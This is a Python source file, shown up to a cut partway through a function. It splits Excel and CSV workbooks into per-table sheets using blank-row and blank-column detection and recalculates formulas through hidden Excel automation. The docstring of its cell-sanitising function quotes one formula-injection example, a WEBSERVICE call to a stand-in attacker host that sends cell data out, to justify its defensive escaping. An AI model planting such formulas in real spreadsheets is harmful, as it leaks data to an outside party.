"""split_tables.py — sort Excel workbooks by how many tables sit on each sheet.

For every workbook in a chosen folder (top level only, not sub-folders), each
sheet is scanned for "tables" using a purely geometric rule: a table is a
rectangular block of non-empty cells, separated from any other table on the
sheet by at least one fully blank row (a stacked/vertical split) and/or a
fully blank column running the height of the block (a side-by-side/horizontal
split). This is the same vertical-band / horizontal-cluster idea used by
excel_pipeline_3's stage1_multitable.py, but driven off raw cell occupancy
instead of that script's text-vs-header row scoring — that scoring is tuned
for PII exports (it tells a header apart from data by looking for SSNs,
dates, phone numbers, dollar amounts, etc. in the data row) and silently
merges a whole table into "no table found" when the data is plain text or
plain numbers with no such pattern. Blank-row/blank-column detection has no
such blind spot and works the same regardless of what the cells contain.

A detected block only counts as a real table if it has at least
MIN_TABLE_ROWS rows (currently 2) -- a smaller block (most commonly a single
cell, e.g. a lone date or label stamped above the real table and separated
from it by one blank row) forms its own blank-row/blank-column-separated
"block" exactly like a genuine table does, but isn't one, and is excluded
from the output's table sheets. There is deliberately no minimum column
count: a genuine single-column table (e.g. a plain list of names, IDs, or
account numbers spanning many rows) is real tabular data and must still get
the same "Detected via" note / per-table sheet treatment as any other
table -- the row-count floor alone is enough to tell a real table apart from
the single-cell fragment case above, since that fragment is always exactly
one row.

A too-small block that sits directly above the NEXT real table on the same
sheet (no other table in between) is treated as that table's own title/
caption -- e.g. a bolded heading or a lone date stamp one row above the real
data -- and its text is attached to that table's own sheet as "Additional
context" in cell B1 (see _match_context_fragments / _write_additional_context_note),
the same B1 convention doc_reader_v2.py uses for a table's own title/
surrounding text. Only a fragment with no table following it anywhere later
in the sheet (e.g. a trailing footnote after the last table) has no table to
attach to, and is reported instead, sheet name + cell range + a short content
preview, on a "Reviewer Note" sheet inserted at the front of the output
workbook (see _write_skipped_fragments_sheet) -- present only when at least
one fragment was actually left unmatched.

The same caption-as-context treatment applies even when there's no blank row
to split the caption out on its own -- e.g. a company name and a "Period:
..." date stamp sitting directly above a table's real header, all part of
the same blank-row-bounded block. Before header detection runs, each block's
leading rows are checked for exactly this: a row occupying far fewer columns
than the block's real header/data rows is peeled off as a caption line (see
_peel_leading_caption_rows), added to the same context-matching pool as any
other skipped fragment, and the table is considered to start at the first
row that isn't one of these narrow leading lines.

It also applies when the caption sits in its OWN blank-row-separated block
rather than glued to the top of the table's block -- e.g. two stacked
"CLIENT: ..." / "PLAN: ..." lines, each only one column wide, immediately
above a genuine multi-column table. A block that short would otherwise still
clear MIN_TABLE_ROWS on row count alone and become a bogus table of its own,
so a block no more than MAX_HEADER_BLOCK_ROWS tall, occupying fewer than half
as many columns as the very next (real) block, is treated as that next
table's caption instead of a table in its own right (see detect_tables'
"caption-block lookahead").

Every detected table's own first row is checked as a header candidate: if
every one of its non-empty cells is text (not a number, date, or boolean),
it's left alone as that table's header, same as always. If it isn't -- e.g.
the table has no header row of its own, just data -- a synthetic header row
("column 1", "column 2", ... "column N") is inserted ahead of it instead, and
the table's own content shifts down one extra row to make room (see
_table_has_header / _write_synthetic_header).

Two (or more) detected tables that sit one after another with the exact same
column range are treated as one logical table split apart by a blank spacer
row -- e.g. a section break partway down a long list -- and are merged back
into a single table before any of the above runs (see
_merge_adjacent_same_column_tables). Only the first chunk's own first row is
ever considered as the merged table's header; later chunks contribute data
rows only, never a second header.

A short row-block (see MAX_HEADER_BLOCK_ROWS) sitting directly above another
block, separated by exactly one blank row, is checked for a different shape:
a shared multi-row header that would otherwise fool the block below it into
looking like two or more unrelated side-by-side tables (e.g. a two-row header
whose own cells -- "Social Security" over "Number" in one column, a bare
"Co Code" in another -- span a full blank column that also runs through the
data underneath). When that header's own occupied columns reach into EVERY
one of the data block's would-be side-by-side splits, detect_tables fuses
them: the header block's rows are consumed entirely (never reported as their
own table or as a skipped fragment) to build one real per-column header --
joining stacked header rows in the same column together, e.g. "Social
Security" + "Number" -> "Social Security Number" -- and the data block
becomes ONE table spanning the full bridged width instead of splitting on
the blank column. See detect_tables' own docstring for exactly when this
does and doesn't fire -- notably, a header glued directly to the top of its
OWN block with no blank row under it (e.g. a plain header row immediately
followed by data rows, nothing separating them) is untouched by this at all;
that shape is already handled by _peel_leading_caption_rows/_table_has_header
as a completely ordinary single-block table.

Every detected table — whether it's the only table on its sheet or one of
several split out of a multi-table sheet — ends up on its own sheet named
"Table_N (original sheet name)" with a "Detected via" note written into cell
A1, one row above the table's own (shifted-down) content, the same
note-in-A1-then-headers-below layout doc_reader_v2.py uses for its parsed
output:

    Detected via: <reason>  |  Excel | <original sheet name>

<reason> is "Single-table sheet (no split)" when that sheet's one table was
left as-is, or "Multi-table sheet split" for each sheet produced by splitting
a multi-table sheet — so the note always says whether a multi-table sheet was
detected on that source sheet or not. A sheet contributing zero detected
tables — no data at all, content too small to count as a table, or a whole
sheet skipped outright for containing a merged cell or an image (see the
bullet below) — is REMOVED from the output workbook entirely rather than
left in untouched; the output is meant to hold only genuine parsed tables
plus the "Reviewer Note" sheet (see _write_skipped_fragments_sheet), never a
leftover native sheet nobody actually parsed.

  * A workbook where every sheet holds at most one table is a "single-table"
    file. A note-added, per-table-sheet-renamed COPY is saved as .xlsx into a
    "single-table excels" sub-folder; the original file is LEFT IN PLACE,
    untouched, at its source location.

  * A workbook with at least one sheet holding more than one table is a
    "multi-table" file. The original is likewise LEFT IN PLACE. A COPY is
    built where every multi-table sheet is replaced by one new sheet per
    table (values, styles, number formats, merged cells and column widths are
    copied into each new sheet, shifted down one row for the note); sheets
    that already held a single table are renamed/noted the same way. That
    copy is saved as .xlsx into a "modified single-table excels" sub-folder.

  * Any sheet containing at least one merged cell, or at least one embedded
    image, is never run through table detection at all. A merged cell (a
    wide "merge and center" banner used for a title, date stamp, or a
    paragraph of narrative text, in particular) can make a purely geometric
    block look exactly like a real table's row even when it isn't one, with
    no reliable way to tell the two apart geometrically. An image is excluded
    for a different reason: it can BE the sheet's real content (a scanned
    signature, a screenshotted chart) that a cell-occupancy scan has no way
    to read at all, regardless of whether ordinary cell data also happens to
    sit elsewhere on that same sheet. Rather than guess at either, that whole
    sheet contributes zero tables and gets one row on the "Reviewer Note"
    sheet instead ("Sheet contains merged cell(s)/image(s) -- unreadable
    information -- not parsed, needs manual review") -- see process_file's
    own per-sheet gate.

  * A sheet with MAX_SKIPPED_FRAGMENTS_PER_SHEET (3) or more unmatched
    skipped fragments (see _match_context_fragments) is treated the same
    way: too unreliable to trust, so any real table detect_tables also found
    on it is discarded too, and the sheet gets one consolidated "Reviewer
    Note" row reporting the total fragment count instead of one row per
    fragment. A workbook whose sheets collectively rack up more than
    MAX_SKIPPED_FRAGMENTS_PER_FILE (10) unmatched fragments is rejected
    outright at the FILE level -- overriding even a real table found on some
    other, cleaner sheet in the same workbook -- see process_file's own
    per-sheet and file-level fragment-count gates.

  * A sheet producing more than MAX_TABLES_PER_SHEET (5) tables is treated as
    a likely detect_tables mistake rather than a genuine multi-table sheet --
    e.g. formatting or stray content fooling the geometric scan into
    splitting a sheet into implausibly many pieces. This rejects the WHOLE
    file outright, the moment it happens on even one sheet, the same way the
    file-level fragment-count gate does -- see process_file's own per-sheet
    table-count gate.

  * A workbook where NO sheet has even one real table (see _is_real_table --
    e.g. every sheet was either too small a fragment, too fragmented, or
    skipped outright for containing a merged cell or an image, per the
    bullets above) is a "no_tables" file -- same outcome the file-level
    fragment-count and table-count gates above force unconditionally.
    Nothing is written to either sub-folder and the original is not touched
    at all; process_file returns status="no_tables" so the caller
    (triage_pipeline.py's stage2_process_excels) can route a copy of the
    untouched original to manual review instead of treating it as a
    successful parse.

Both destination sub-folders are created inside the input folder, mirroring
how stage1_multitable.py creates its "Manual Review" folder inside the root
it scans.

CAVEATS (read before trusting the output blindly):
  * Header detection is a simple type-based heuristic, not content-pattern
    scoring (deliberately -- see the note above on why this script avoids
    that approach): a data row that happens to be all-text (e.g. a column of
    names with no numeric column anywhere in the row) reads as a header and
    is left alone rather than getting a synthetic one.
  * A blank row is treated as a table boundary, but two resulting tables with
    the exact same column range are merged back together on the assumption
    that they're one logical table with a spacer row in the middle (see
    _merge_adjacent_same_column_tables) — this is a heuristic, not a content
    check, so two genuinely unrelated tables that happen to share a column
    span and sit next to each other with nothing but blank rows between them
    will also be merged.
  * Peeling narrow leading caption rows off a block (see
    _peel_leading_caption_rows) is also a width heuristic, not a content
    check: a genuine two-column header where one column happens to be blank
    in that row could be mistaken for a caption line and peeled off instead
    of kept as the header.
  * A stray single cell sitting far from the main block (e.g. a lone "Notes:"
    note off to the side) is folded into the nearest real table rather than
    split out on its own — a side-by-side split is only made when EVERY
    resulting cluster has at least 2 occupied cells, so a real second table
    is required on both sides of the gutter, not just noise.
  * .xlsx/.xlsm are read with data_only=True, so the output copy carries each
    formula's last-CACHED value, not the formula itself — restructuring the
    sheet would have invalidated most formula references anyway. If a
    workbook was never recalculated/saved by Excel (or anything else with a
    formula engine), a formula cell has no cached value at all, and
    data_only=True reads it back as blank — not something restructuring the
    sheet caused. When that happens (and pywin32 is installed), a hidden,
    dedicated Excel instance recalculates a disposable copy of the file and
    only THOSE specific blank cells are patched with the resulting values
    (see _fill_blank_formula_values); everything else about the file is read
    exactly as before. The real source file is opened ReadOnly=True and
    closed with SaveChanges=False, and every write only ever targets a
    throwaway temp copy, so it is never modified. Skipped entirely (no Excel
    launched) for a workbook with no formula cells, or whose formula cells
    already all carry a cached value. Without pywin32 installed, or if Excel
    automation fails for a file (e.g. Excel isn't installed on this machine),
    this falls back to the old behavior — a warning is logged and the
    affected cells are left blank — rather than failing the whole file.
  * .xls (needs `pip install "xlrd>=1.2,<2"`) and .xlsb (needs
    `pip install pyxlsb`) are converted to an in-memory workbook first; that
    conversion carries values only, no formatting. If the matching library
    isn't installed, those files are skipped with a warning instead of
    crashing the batch. Because every output is now saved via openpyxl (to
    carry the A1 note), a single-table .xls/.xlsb/.csv file's output is saved
    as .xlsx too, not moved in its native format.
  * .csv has only one sheet, but that sheet can still contain more than one
    table (e.g. two tables stacked with a blank row between them) — it will
    still route through the "multi-table" / modified-copy path in that case.
  * Pivot tables are not specially handled (unlike stage1_multitable.py) —
    a pivot sheet's rendered cells are read like any other sheet.
  * The merged-cell and image gates (see process_file's per-sheet check) are
    both all-or-nothing per SHEET: a sheet with one genuine multi-column
    table and one unrelated merged title cell or decorative logo image
    somewhere else on that same sheet still has its real table sent for
    manual review along with everything else on that sheet, rather than only
    excluding the merged cell's/image's own region. A workbook that
    legitimately mixes merged formatting or a logo image with real tabular
    data on the same sheet will have that sheet routed to manual review
    every time, with no attempt to parse the real table on it.
  * The image check (see _sheet_has_images) only detects an image openpyxl
    itself parsed into the loaded workbook's private ws._images list -- it
    says nothing about a chart, a shape/text box, or an OLE-embedded object,
    none of which land in that same list, so a sheet whose only
    non-cell content is one of those is not caught by this check at all.
  * Header fusion (see MAX_HEADER_BLOCK_ROWS / detect_tables' own docstring)
    is a geometric heuristic too, same caveat as _merge_adjacent_same_column_
    tables above: a genuinely small, unrelated DATA block (not a header at
    all) sitting directly above another block that happens to split into
    side-by-side tables, with its own columns happening to land inside every
    one of those splits, would also get consumed as if it were that block's
    header -- MAX_HEADER_BLOCK_ROWS (3) bounds how large a block this can
    happen to, but doesn't eliminate the false-positive risk for a
    coincidentally-aligned small block that size or smaller.

USAGE
    python split_tables.py [folder]

    If `folder` is omitted, a folder-picker dialog opens (via tkinter).
"""
from __future__ import annotations

import argparse
import atexit
import bisect
import contextlib
import csv
import io
import json
import os
import re
import shutil
import sys
import tempfile
import time
from copy import copy
from pathlib import Path
from typing import Optional

try:
    import openpyxl
    from openpyxl.utils import get_column_letter
    from openpyxl.styles import Font, Alignment, PatternFill
    from openpyxl.cell.cell import ILLEGAL_CHARACTERS_RE
except ImportError:
    sys.exit("ERROR: openpyxl is required. Install with: pip install openpyxl")

try:
    import xlrd
    HAS_XLRD = True
except ImportError:
    HAS_XLRD = False

try:
    import win32com.client
    HAS_WIN32COM = True
except ImportError:
    HAS_WIN32COM = False

try:
    from pyxlsb import open_workbook as _open_xlsb
    HAS_PYXLSB = True
except ImportError:
    HAS_PYXLSB = False

SINGLE_DIRNAME = "single-table excels"
MODIFIED_DIRNAME = "modified single-table excels"
_SUPPORTED_SUFFIXES = {".xlsx", ".xlsm", ".xls", ".xlsb", ".csv"}
_MIN_CLUSTER_CELLS = 2  # a side-by-side cluster must have at least this many
                       # occupied cells to count as a real table, not noise
MIN_TABLE_ROWS = 2  # a detected block needs at least this many rows to count
                     # as a real table (see _is_real_table) -- anything
                     # smaller (a lone date or label sitting in its own
                     # blank-separated block, always exactly one row) is a
                     # skipped fragment, not a table. No minimum column count:
                     # a genuine single-column table (e.g. a plain list of
                     # names or IDs) is still a real table.
_MIN_PEEL_WIDTH = 2  # _peel_leading_caption_rows only bothers comparing a
                     # leading row's width against half the block's max width
                     # when the block itself is at least this wide -- below
                     # that there's no meaningful "narrower than half" gap to
                     # detect a caption line by, unrelated to whether the
                     # block ends up counting as a real table (see
                     # _is_real_table, which has no column floor at all).
MAX_HEADER_BLOCK_ROWS = 3  # a row-block this short or shorter, separated by a
                           # blank row from the NEXT row-block, is a candidate
                           # shared multi-row header for that next block --
                           # but only when the next block would otherwise
                           # geometrically split into 2+ side-by-side tables
                           # AND this block's own occupied columns touch every
                           # one of those splits (see detect_tables' own
                           # header-fusion check) -- capped deliberately low
                           # so a genuine small DATA block sitting above
                           # another block is never mistaken for that block's
                           # header just because their columns happen to line
                           # up. Does not affect a header glued directly to
                           # the top of its own block with no blank row
                           # between them -- that's _peel_leading_caption_rows'
                           # job already, and only ever applies within ONE
                           # row-block, never across two separate ones.

# Hard ceiling on the sheet extent detect_tables will build an occupancy grid
# for (see _true_sheet_extent / detect_tables) -- a real spreadsheet's data
# essentially never gets anywhere near this large; a sheet that does is
# almost certainly a false extent that slipped past _true_sheet_extent's own
# non-empty-cell filtering, not real data, and building the grid anyway would
# risk hanging/exhausting memory rather than erroring cleanly.
MAX_SHEET_ROWS = 20_000
MAX_SHEET_COLS = 2_000

# "Detected via" note constants (see _write_detected_via_note) — mirror
# doc_reader_v2.py's own "Detected via: {source} | {DOCUMENT_TYPE} | ..."
# convention on its parsed output sheets.
DOCUMENT_TYPE = "Excel"
MULTI_TABLE_REASON = "Multi-table sheet split"
SINGLE_TABLE_REASON = "Single-table sheet (no split)"

# "Reviewer Note" sheet reason strings (see _write_skipped_fragments_sheet /
# process_file) -- one for a too-small geometric fragment, and two for a
# whole sheet process_file refused to run detect_tables on at all: one for
# containing at least one merged cell, one for containing at least one image
# (see process_file's own per-sheet gate, which checks for both and combines
# these two phrases if a sheet has both).
TOO_SMALL_REASON = f"Below minimum table size (needs {MIN_TABLE_ROWS}+ rows)"
MERGED_CELL_PHRASE = "merged cell(s)"
IMAGE_PHRASE = "image(s) -- unreadable information"
UNPARSEABLE_SHEET_REASON_TEMPLATE = "Sheet contains {phrases} -- not parsed, needs manual review"
BLANK_SHEET_REASON = "Sheet has no data"

# A sheet this fragmented (this many or more UNMATCHED skipped fragments --
# the ones that would otherwise each get their own "Reviewer Note" row, not
# counting a fragment already absorbed as a table's own "Additional context")
# is treated as too unreliable to trust any table detected on it either --
# see process_file's own per-sheet fragment-count gate, which discards that
# sheet's tables (if any) the same way the merged-cell/image gate does,
# rather than parsing a table sitting among that much surrounding noise.
MAX_SKIPPED_FRAGMENTS_PER_SHEET = 3
# A workbook whose sheets collectively rack up MORE than this many unmatched
# skipped fragments is treated as too unreliable to parse AT ALL -- overriding
# even a real table found on some other, cleaner sheet in the same workbook --
# see process_file's own file-level fragment-count gate, which sends the
# whole file to manual review the same way the "zero real tables anywhere"
# case does.
MAX_SKIPPED_FRAGMENTS_PER_FILE = 10
TOO_MANY_FRAGMENTS_SHEET_REASON = (
    f"Sheet contains {MAX_SKIPPED_FRAGMENTS_PER_SHEET}+ skipped fragments -- "
    "too unreliable to parse, needs manual review"
)

# More than this many tables split out of a SINGLE source sheet is treated as
# a likely detect_tables mistake -- e.g. formatting or stray content fooling
# the geometric blank-row/blank-column scan into splitting a sheet into far
# more "tables" than a real multi-table sheet plausibly has -- rather than
# genuine multi-table content. Unlike the two fragment-count gates above,
# this rejects the WHOLE FILE the moment it happens on even one sheet (see
# process_file's own per-sheet table-count gate), not just that one sheet:
# a detection failure producing output this implausible calls the rest of
# the file's detection into question too, not only this sheet's.
MAX_TABLES_PER_SHEET = 5

def _sanitize_cell_value(value):
    """Neutralize CSV/Excel formula injection in cell content sourced from an
    untrusted workbook, and strip XML-illegal control characters.

    A source file (particularly a .csv, but also a string cell in .xls/
    .xlsb/.xlsx) can carry a crafted value like =WEBSERVICE("http://attacker/"
    &A1) or =HYPERLINK(...) that becomes a live formula the instant it's
    assigned to an openpyxl cell -- openpyxl infers data_type='f' from a
    leading '=' (also '+', '-', '@') regardless of whether the source cell
    was itself a formula. Ported from doc_reader_v2.py's _sanitize_cell_value
    so every output workbook this module produces gets the same treatment."""
    if isinstance(value, str):
        value = ILLEGAL_CHARACTERS_RE.sub("", value)
    if isinstance(value, str) and value and value[0] in ("=", "+", "-", "@", "\t", "\r"):
        return "'" + value
    return value


# --------------------------------------------------------------------------
# Legacy-format loaders (adapted from headerDetection/extract_headers.py) —
# openpyxl only reads .xlsx/.xlsm natively, so .xls/.xlsb/.csv are converted
# to an in-memory openpyxl Workbook first. That conversion carries values
# only (no styles) for .xls/.xlsb; .csv never had styles to begin with.
# --------------------------------------------------------------------------

def _xls_to_openpyxl(path: Path) -> "openpyxl.Workbook":
    if not HAS_XLRD:
        raise ImportError(
            'xlrd is required to process .xls files. Install with: '
            'pip install "xlrd>=1.2,<2"')
    xls = xlrd.open_workbook(str(path))
    try:
        wb = openpyxl.Workbook()
        wb.remove(wb.active)
        for idx in range(xls.nsheets):
            xls_ws = xls.sheet_by_index(idx)
            ws = wb.create_sheet(title=xls_ws.name)
            for r in range(xls_ws.nrows):
                row_vals = []
                for c in range(xls_ws.ncols):
                    raw = xls_ws.cell(r, c).value
                    if isinstance(raw, str) and raw.strip() == "":
                        raw = None
                    elif isinstance(raw, float) and raw == int(raw):
                        raw = int(raw)
                    row_vals.append(_sanitize_cell_value(raw))
                ws.append(row_vals)
        return wb
    finally:
        xls.release_resources()


def _xlsb_to_openpyxl(path: Path) -> "openpyxl.Workbook":
    if not HAS_PYXLSB:
        raise ImportError(
            "pyxlsb is required to process .xlsb files. Install with: "
            "pip install pyxlsb")
    wb = openpyxl.Workbook()
    wb.remove(wb.active)
    try:
        with _open_xlsb(str(path)) as xlsb:
            for sheet_name in xlsb.sheets:
                ws = wb.create_sheet(title=sheet_name)
                with xlsb.get_sheet(sheet_name) as sheet:
                    for row in sheet.rows():
                        if not row:
                            ws.append([])
                            continue
                        width = row[-1].c + 1
                        row_vals = [None] * width
                        for cell in row:
                            row_vals[cell.c] = _sanitize_cell_value(cell.v)
                        ws.append(row_vals)
        return wb
    except Exception:
        wb.close()
        raise


def _csv_to_openpyxl(path: Path) -> "openpyxl.Workbook":
    text = None
    for enc in ("utf-8-sig", "cp1252", "latin-1"):
        try:
            text = path.read_text(encoding=enc)
            break
        except UnicodeDecodeError:
            continue
    if text is None:  # pragma: no cover - latin-1 above never raises
        raise ValueError(f"Could not decode '{path.name}' with any known encoding")

    sample = text[:8192]
    try:
        dialect = csv.Sniffer().sniff(sample, delimiters=",;\t|")
    except csv.Error:
        dialect = csv.excel

    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "Sheet1"
    for fields in csv.reader(io.StringIO(text), dialect):
        ws.append([(_sanitize_cell_value(value) if value != "" else None) for value in fields])
    return wb


def open_any_workbook(
    path: Path, log_fn=print, temp_base_dir: Optional[Path] = None
) -> "openpyxl.Workbook":
    """temp_base_dir is passed straight through to _fill_blank_formula_values
    (see its own docstring) -- None (the default, for standalone use of this
    module) leaves it up to tempfile's own default; a caller like
    triage_pipeline.py that already has an approved-storage folder on hand
    passes that instead, so the disposable recalculated copy never lands in
    the OS temp dir."""
    suffix = path.suffix.lower()
    if suffix == ".xls":
        return _xls_to_openpyxl(path)
    if suffix == ".xlsb":
        return _xlsb_to_openpyxl(path)
    if suffix == ".csv":
        return _csv_to_openpyxl(path)

    wb = openpyxl.load_workbook(path, data_only=True)
    if suffix in (".xlsx", ".xlsm"):
        _fill_blank_formula_values(wb, path, log_fn=log_fn, temp_base_dir=temp_base_dir)
    return wb


# --------------------------------------------------------------------------
# Excel-COM formula recalculation -- a .xlsx/.xlsm formula cell only ever
# carries a value in `wb` (loaded with data_only=True, above) if some program
# previously calculated and saved it; a workbook generated or edited without
# ever being recalculated in Excel has formula cells with NO cached value, so
# data_only=True reads them back as blank (None) -- openpyxl itself has no
# formula engine and cannot compute a value where none was stored.
#
# When that happens, a dedicated hidden Excel instance is used to recalculate
# a DISPOSABLE COPY of the file and only that copy's now-populated values are
# patched into `wb` for the specific cells that came back blank -- everything
# else about `wb` (styles, merged cells, column widths, every other cell's
# value) is untouched. The real source file at `path` is opened with
# ReadOnly=True (Excel itself then refuses to save back to it) and closed
# with SaveChanges=False as a second safeguard, and every write this module
# makes only ever targets a throwaway temp copy -- `path` is never modified.
#
# Skipped entirely (no Excel launched at all) for a workbook that has no
# formula cells, or whose formula cells already all carry a cached value --
# see _blank_formula_cells.
#
# A cell whose real value could never be determined at all (no pywin32
# installed, Excel automation failed outright, or the recalculated copy came
# back missing the sheet entirely) is NOT just left blank -- see
# _mark_unresolved_formula_cells below for why a silent blank is actively
# worse than no output at all here.
# --------------------------------------------------------------------------

# Written into a formula cell whose real value _fill_blank_formula_values
# could not determine by any means (see _mark_unresolved_formula_cells) --
# distinct and non-empty on purpose. A silently blank cell there is
# indistinguishable, downstream, from a cell that's genuinely empty:
# detect_tables' purely geometric blank-row/blank-column table detection
# (see the module docstring) would read the gap as real, changing that
# table's row-block splits, column ranges, and _table_has_header's
# header-candidate check -- and a reviewer looking at the finished sheet
# sees a structurally plausible table with a hole in it and no reason to
# distrust it. A visible, styled marker fixes both problems at once: it
# reads as occupied to detect_tables (preserving the table's true shape),
# and it's unmistakably flagged for whoever reviews the output.
UNRESOLVED_FORMULA_MARKER = "#UNRESOLVED FORMULA VALUE"

_excel_app = None  # lazily-started, reused across every file in a batch run
_excel_app_atexit_registered = False  # set once close_excel_app is registered as an atexit fallback


def _get_excel_app():
    """Start (once) or return the shared hidden Excel COM instance used to
    recalculate formula workbooks. A dedicated new process (DispatchEx, not
    Dispatch) so this never attaches to -- or interferes with -- an Excel
    window the user already has open. Reused across a whole batch run rather
    than relaunched per file, since starting Excel itself costs a few seconds
    (see close_excel_app for the matching per-batch cleanup).

    Also registers close_excel_app as an atexit fallback, once, the first
    time this Excel instance is actually started -- every current call site
    (run()'s finally, triage_pipeline.py's stage2_process_excels finally)
    already Quits it through normal control flow, but that only covers code
    that goes through one of those wrappers. Anything else importing this
    module and calling _fill_blank_formula_values directly would otherwise
    have no guaranteed cleanup path at all, leaving EXCEL.EXE running
    invisibly (Visible=False, so there's no window for a user to notice and
    close by hand)."""
    global _excel_app, _excel_app_atexit_registered
    if _excel_app is None:
        _excel_app = win32com.client.DispatchEx("Excel.Application")
        _excel_app.Visible = False
        _excel_app.DisplayAlerts = False
        _excel_app.AskToUpdateLinks = False
        _excel_app.EnableEvents = False
        if not _excel_app_atexit_registered:
            atexit.register(close_excel_app)
            _excel_app_atexit_registered = True
    return _excel_app


def close_excel_app() -> None:
    """Quit the shared Excel COM instance started by _get_excel_app, if one
    was ever started -- a no-op otherwise (Excel automation never available,
    or every processed workbook had no formula cells needing it). Call this
    once at the end of a batch run (see run() / triage_pipeline.py's
    stage2_process_excels) so no orphan EXCEL.EXE process is left behind --
    also registered as an atexit fallback for callers that skip both of
    those (see _get_excel_app).

    A failed Quit() (e.g. a modal dialog Excel is waiting on, or an
    unresponsive COM server) is logged loudly rather than silently swallowed,
    and -- unlike before -- the reference is deliberately left in place
    rather than nulled out regardless: nulling it on failure would discard
    the only handle this process has to that EXCEL.EXE instance, guaranteeing
    it's orphaned. Keeping the reference lets a later retry (including the
    atexit fallback itself, at interpreter shutdown) have another chance at
    closing it properly."""
    global _excel_app
    if _excel_app is None:
        return
    try:
        _excel_app.Quit()
    except Exception as exc:
        print(
            f"  WARNING: failed to quit the hidden Excel automation instance ({exc}) -- "
            "it may still be running as an orphaned EXCEL.EXE process.",
            file=sys.stderr,
        )
        return
    _excel_app = None


def _cell_value_without_materializing(ws, row: int, col: int):
    """Read a cell's value without instantiating it in `ws` if no cell
    already exists there -- ws.cell(row=row, column=col) (a plain read,
    used here previously) unconditionally creates and caches a real
    (blank) Cell object for that coordinate the first time it's accessed,
    even for a read that finds nothing. _blank_formula_cells probes one
    coordinate per formula cell found in a SEPARATE workbook (wb_f, not
    this one) -- every coordinate merely checked this way, not just every
    coordinate holding real data, permanently grows `ws`'s (and therefore
    `wb`'s) real cell dict, and those materialized blank cells are never
    cleaned up: they persist all the way through to rebuild_workbook's own
    wb.save() of the final output file. Reading ws._cells directly instead
    -- the same private-but-effective mechanism _true_sheet_extent already
    uses for the same reason -- finds out whether a cell exists without
    ever creating one. Falls back to ws.cell(...) if _cells isn't there to
    read (private openpyxl implementation detail, not documented API, so a
    future openpyxl version that renames or removes it should degrade to
    the old (if cell-instantiating) behavior rather than crash outright)."""
    try:
        cells = ws._cells
    except AttributeError:
        return ws.cell(row=row, column=col).value
    cell = cells.get((row, col))
    return cell.value if cell is not None else None


def _iter_materialized_cells(ws):
    """Yield every Cell object ws ALREADY holds, without materializing any
    new one and without risking _blank_formula_cells' own short-circuit
    below hanging or ballooning memory the way _true_sheet_extent's
    docstring describes: ws.iter_rows() on a normal (non-read-only)
    Worksheet, called with no explicit row/column bounds, walks the full
    rectangular range up to ws.max_row x ws.max_column -- and that range
    reflects the highest coordinate ANY cell has ever been instantiated at
    (stray formatting, a cleared-but-not-deleted range, or simply a prior
    ws.cell() read), not the sheet's real data. On such an inflated sheet,
    iterating it can still touch and materialize a large number of blank
    cells despite the caller only ever wanting to know about ones that
    already exist. Reading ws._cells directly -- the same private-but-
    effective mechanism _true_sheet_extent and _cell_value_without_
    materializing already rely on -- sidesteps that regardless of how
    inflated max_row/max_column are. Falls back to a flattened
    ws.iter_rows() (accepting that same risk only in this private-API-broke
    edge case) if _cells isn't there to read."""
    try:
        cells = ws._cells
    except AttributeError:
        for row in ws.iter_rows():
            yield from row
        return
    yield from cells.values()


def _blank_formula_cells(wb, path: Path) -> dict[str, list[tuple[int, int]]]:
    """Cross-check `wb` (already loaded from `path` with data_only=True)
    against a second, lightweight data_only=False/read_only=True load of the
    same file to find every formula cell that came back None in `wb` -- i.e.
    a formula with no cached value, the thing _fill_blank_formula_values
    exists to repair. Returns {sheet_name: [(row, col), ...]}, 1-indexed;
    empty if `wb` has no formula cells at all, or if every formula cell
    already carried a cached value -- either way, nothing for Excel to fix,
    so the caller never launches it.

    Short-circuits before that second load whenever `wb` has no None-valued
    cell anywhere: under data_only=True, a formula with no cached value
    reads back exactly the same as a genuinely empty cell (openpyxl has no
    way to tell the two apart without re-reading the raw formula), so a
    formula-with-no-cached-value can only ever be hiding behind a cell
    that's already None in `wb` -- "nothing is None anywhere" already
    proves there's nothing here to find, with zero additional I/O (`wb` is
    already fully loaded in memory; this only walks Python objects already
    materialized from the FIRST load). Skipping the second load on that
    result avoids what would otherwise be a second full parse of the same
    file -- reopening it, re-parsing every sheet's XML, and iterating every
    cell all over again -- for the common case of a workbook with no
    formulas at all, or one where every formula already carries a cached
    value; previously this ran unconditionally for every single .xlsx/.xlsm
    in a batch regardless of whether it had any chance of finding anything.

    Walks _iter_materialized_cells(ws) rather than ws.iter_rows() -- a
    coordinate with no Cell object at all in `wb` was never a real <c>
    element in the file to begin with (a genuinely absent cell, not merely
    a blank one), so it can't possibly be a formula either; restricting
    this check to cells that already exist keeps its result exactly the
    same while avoiding ws.iter_rows()'s own risk of materializing (and
    hanging/exhausting memory over) a huge range on a sheet whose
    max_row/max_column were inflated by something unrelated to real data
    (see _true_sheet_extent's own docstring)."""
    if not any(cell.value is None for ws in wb.worksheets for cell in _iter_materialized_cells(ws)):
        return {}

    blanks: dict[str, list[tuple[int, int]]] = {}
    wb_f = openpyxl.load_workbook(path, data_only=False, read_only=True)
    try:
        for ws_f in wb_f.worksheets:
            if ws_f.title not in wb.sheetnames:
                continue
            ws = wb[ws_f.title]
            hits = [
                (cell.row, cell.column)
                for row in ws_f.iter_rows()
                for cell in row
                if cell.data_type == "f"
                and _cell_value_without_materializing(ws, cell.row, cell.column) is None
            ]
            if hits:
                blanks[ws_f.title] = hits
    finally:
        wb_f.close()
    return blanks


def _recalc_via_excel(path: Path, excel_app, tmp_dir: Path) -> Path:
    """Drive `excel_app` to open `path` read-only, force a full
    recalculation, and Save-As a copy into `tmp_dir` -- returns the path to
    that recalculated copy for the caller to read values back out of with
    openpyxl the normal way. `path` is opened with ReadOnly=True (Excel
    itself then enforces that it can't be saved back to) and closed with
    SaveChanges=False -- it is never written to."""
    tmp_path = tmp_dir / (path.stem + "_recalc.xlsx")
    wb_com = excel_app.Workbooks.Open(
        str(path), ReadOnly=True, UpdateLinks=0, IgnoreReadOnlyRecommended=True
    )
    # COM interop routinely returns None here rather than raising -- a
    # corrupt file, or a password prompt suppressed by DisplayAlerts=False
    # -- in which case the .SaveAs below would raise AttributeError, and the
    # finally's own wb_com.Close would then raise a SECOND AttributeError
    # that replaces it as the propagating exception, leaving the caller's
    # log pointing at "'NoneType' object has no attribute 'Close'" instead
    # of the real "Excel could not open this file" cause -- and leaving a
    # hidden EXCEL.EXE holding the open workbook, since nothing ever closes
    # a None handle.
    if wb_com is None:
        raise IOError(f"Excel could not open {path}")
    try:
        excel_app.CalculateFullRebuild()
